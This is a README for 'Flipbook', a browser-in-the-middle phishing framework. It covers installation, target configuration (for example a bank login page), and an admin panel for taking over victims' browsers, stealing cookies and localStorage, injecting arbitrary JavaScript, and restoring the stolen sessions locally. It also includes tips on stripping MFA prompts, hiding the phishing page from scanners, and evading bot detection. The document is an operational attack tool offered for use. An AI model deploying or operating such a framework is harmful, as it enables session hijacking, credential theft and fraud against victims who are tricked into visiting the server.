# Flipbook



Browser-in-the-Middle (BitM) phishing framework — Inspired by Cuddlephish

**Architecture:** Playwright headless Chromium → CDP `Page.startScreencast` → Socket.IO binary frames → victim `<canvas>` via `createImageBitmap()`. No XVFB. No WebRTC. No STUN/TURN.

---

## Requirements

- Node.js 22 LTS
- Debian/Ubuntu host (Playwright's `--with-deps` installs Chromium system libs)
- screen or tmux (for persistent sessions)
- Nginx / LE certs (or bring your own plan)

---

## Installation

```bash
# Clone / unzip to server
cd flipbook

# Install Node deps
npm install

# Install Playwright's Chromium browser + system libraries
npx playwright install chromium --with-deps

# Build TypeScript → dist/
npm run build
```

---

## Configuration

### config.json

Copy `config.example.json` to `config.json` and customize:

```bash
cp config.example.json config.json
```

```json
{
  "default_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...",
  "socket_key": "changeme123",
  "admin_ips": ["127.0.0.1", "123.123.123.123"],
  "proxy": null,
  "port": 3000,
  "target": "default"
}
```

| Field | Description |
|---|---|
| `socket_key` | Shared secret for admin authentication. Change before deploying. |
| `admin_ips` | IPs allowed to access `/admin`. Use `["*"]` to allow any (not recommended). |
| `proxy` | Optional upstream proxy, e.g. `"http://127.0.0.1:8080"`. `null` = no proxy. |
| `port` | Server port (default: 3000). Can be overridden with `PORT` env var. |
| `target` | Target name from `targets.json` to load for all victims. |

### targets.json

Add targets interactively:

```bash
npm run add-target
```

This will prompt you for:
- **Target name** (used in `config.json` to select this target)
- **Target URL** (the site to load in the victim's browser)
- **Viewport dimensions** (width/height for the Chromium browser)
- **Optional JavaScript injection** (runs after page load)

Or edit `targets.json` directly:

```json
{
  "mybank": {
    "name": "My Bank",
    "url": "https://mybank.com/login",
    "width": 1920,
    "height": 1080,
    "inject_js": "console.log('injected')"
  },
  "default": {
    "name": "Default Target",
    "url": "https://example.com",
    "width": 1920,
    "height": 1080
  }
}
```

| Field | Description |
|---|---|
| `name` | Display name (shown in admin UI and used as key in targets.json) |
| `url` | Target site the victim's browser will load |
| `width` / `height` | Chromium viewport size — should match what the target site expects |
| `inject_js` | Optional JS injected after page load (e.g. pre-fill forms, remove MFA prompts) |

**Important:** After adding a target, set it in `config.json`:

```json
{
  "target": "mybank"
}
```

All victims will load this target. To switch targets, update `config.json` and restart the server.

---

## Running

### Development (tsx, no build step)

```bash
npm run dev
```

### Production

Build and start the server:

```bash
npm run build
npm start
```

Server starts on `http://0.0.0.0:3000` by default (configured in `config.json`). Override with env vars:

```bash
PORT=8080 HOST=127.0.0.1 npm start
```

**Running in screen/tmux (recommended for production):**

```bash
# Using screen
screen -S flipbook
npm start
# Detach: Ctrl+A, D
# Reattach: screen -r flipbook

# Using tmux
tmux new -s flipbook
npm start
# Detach: Ctrl+B, D
# Reattach: tmux attach -t flipbook
```

This ensures the server survives SSH disconnections and continues running in the background.

---

## Swap (important on low-RAM hosts)

Chromium OOM-kills silently without swap. Run once after provisioning:

```bash
fallocate -l 4G /swapfile && chmod 600 /swapfile
mkswap /swapfile && swapon /swapfile
echo '/swapfile none swap sw 0 0' >> /etc/fstab
```

---

## URLs

| URL | Description |
|---|---|
| `http://HOST/admin` | Admin panel (IP-gated by `admin_ips`) |
| `http://HOST/` | Victim canvas page (root path, no parameters needed) |
| `http://HOST/api/config` | Returns configured target name (used by victim page) |
| `http://HOST/healthz` | Health check |

**Note:** When using nginx as a reverse proxy, you can configure the phishing page to appear at a non-root path (e.g., `/login/`) to hide from scanners. The root path can return 404 while `/login/` proxies to Flipbook. See the nginx configuration section for details.

---

## Victim payload

Simply redirect victims to your server's root URL:

```
https://HOST/
```

**No URL parameters needed.** The target is configured server-side in `config.json` via the `target` field. All victims connecting to the server will automatically load the configured target site.

To change the target, update `config.json` and restart the server.

---

## Admin workflow

1. Open `/admin` from an allowed IP (configured in `admin_ips`)
2. Authenticate with `socket_key` when prompted
3. Wait for victims to appear in the left sidebar (thumbnails auto-update)
4. Click a victim card to select it
5. **Take Over** — your mouse/keyboard now controls the victim's browser; victim sees a "please wait" overlay
6. **Steal Cookies / Steal Storage** — dumps JSON to the admin panel
7. **Give Back** — returns control to victim
8. **Inject JS** — run arbitrary JS in the victim's page
9. **Navigate** — redirect the victim's browser to any URL

**Note:** Victims do not need authentication — they simply visit the root URL and are automatically connected to the configured target.

---

## Session restore

After stealing cookies/storage, restore them in a local browser:

```bash
# Save cookies from admin panel to cookies.json
npm run session-restore -- --cookies cookies.json --url https://mybank.com

# With localStorage too
npm run session-restore -- --cookies cookies.json --storage storage.json --url https://mybank.com
```

This opens a headed Playwright browser with the stolen session pre-loaded.

---

## Reverse proxy (nginx)

For production deployments, use nginx as a TLS-terminating reverse proxy. The included `nginx.conf` is configured to:
- Redirect HTTP to HTTPS
- Proxy all traffic to `localhost:3000` (Flipbook server)
- Handle WebSocket upgrades (required for Socket.IO)
- Include security headers and SSL best practices
- Log access and errors

### Automated setup (recommended)

Run the included setup script as root:

```bash
sudo bash setup-nginx.sh
```

This will:
1. Install nginx and certbot
2. Create temporary HTTP-only config (avoids chicken-and-egg SSL problem)
3. Obtain Let's Encrypt SSL certificate via certbot
4. Apply final HTTPS config with proper proxy settings
5. Enable nginx to start on boot

**Note:** The script creates an nginx config that properly proxies `/api/` endpoints (required for victim page initialization) and forwards real client IPs via `X-Forwarded-For` headers.

### Manual setup

```bash
# Install nginx and certbot
sudo apt-get update
sudo apt-get install -y nginx certbot python3-certbot-nginx

# Create temporary HTTP-only config (no SSL references)
cat > /etc/nginx/sites-available/flipbook << 'EOF'
server {
    listen 80;
    listen [::]:80;
    server_name yourdomain.com;
    
    location /.well-known/acme-challenge/ {
        root /var/www/html;
    }
    
    location / {
        proxy_pass http://127.0.0.1:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
EOF

# Enable site and remove default
sudo ln -s /etc/nginx/sites-available/flipbook /etc/nginx/sites-enabled/
sudo rm /etc/nginx/sites-enabled/default

# Test and start nginx
sudo nginx -t
sudo systemctl enable nginx
sudo systemctl start nginx

# Obtain SSL certificate (certbot will modify the config)
sudo certbot --nginx -d yourdomain.com

# Apply final config with SSL (replace example.com with your domain)
sudo sed 's/example\.com/yourdomain.com/g' nginx.conf > /etc/nginx/sites-available/flipbook
sudo nginx -t
sudo systemctl reload nginx
```

**Important:** The nginx config includes `X-Forwarded-For` headers which are used by Flipbook to display real victim IPs in the admin panel. Ensure Fastify's `trustProxy: true` is enabled in `src/server.ts` (already configured in current version).

### Certificate renewal

Certbot automatically sets up a systemd timer for renewal. Test it with:

```bash
sudo certbot renew --dry-run
```

### Useful commands

```bash
sudo systemctl status nginx              # Check nginx status
sudo systemctl reload nginx              # Reload config after changes
sudo tail -f /var/log/nginx/flipbook-access.log  # View access logs
sudo tail -f /var/log/nginx/flipbook-error.log   # View error logs
```

---

## Host sizing

| Concurrent victims | RAM | vCPU |
|---|---|---|
| 1–3 | 4 GB | 2 |
| 4–8 | 8 GB | 2–4 |
| 10–15 | 16 GB | 4 |

Hetzner CX31 (2 vCPU / 8 GB / €10/mo) is the recommended starting point.

---

## Performance & Optimizations

### Paste Timing
Current paste operation timing (optimized for speed while maintaining reliability):
- **Initial pause:** 120ms (allows field focus after click)
- **Per-character delay:** 7ms (faster than typical human typing)

These values can be adjusted in `src/input-handler.ts` if needed for specific targets.

### IP Forwarding
When using nginx as a reverse proxy, Flipbook correctly displays real victim IPs in the admin panel by:
- Fastify configured with `trustProxy: true`
- Socket.IO reads `X-Forwarded-For` headers
- nginx sets proper proxy headers (configured in `nginx.conf`)

### Anti-Bot Detection
Flipbook includes the `puppeteer-extra-plugin-stealth` plugin to mask basic automation signals. However, modern anti-bot systems (Cloudflare, Akamai, etc.) use advanced fingerprinting that may still detect headless browsers. The tool works best against:
- Internal corporate applications
- Older authentication systems
- Sites without sophisticated bot detection

For sites with advanced protection, consider:
- Using residential proxies
- Testing with different user agents
- Targeting less protected endpoints

## Project structure

```
src/
  server.ts           — Fastify entry point, routes, Socket.IO wiring
  types.ts            — All shared interfaces and Socket.IO event maps
  browser-manager.ts  — Pre-warm pool, claim/release lifecycle
  screencast.ts       — CDP Page.startScreencast wrapper
  input-handler.ts    — Mouse/keyboard forwarding with coordinate scaling
  session-extractor.ts — Cookie + localStorage extraction via CDP
  socket-handlers.ts  — All Socket.IO event registrations
  session-logger.ts   — Session event logging to disk
  metrics.ts          — Performance metrics collection

public/
  victim.html         — Canvas-based victim page (no WebRTC)
  admin.html          — Bootstrap dark theme admin panel

tools/
  add-target.ts       — Interactive target setup
  session-restore.ts  — Session injection tool

setup-nginx-fixed.sh  — Automated nginx + Let's Encrypt setup
nginx.conf            — nginx reverse proxy configuration template
```
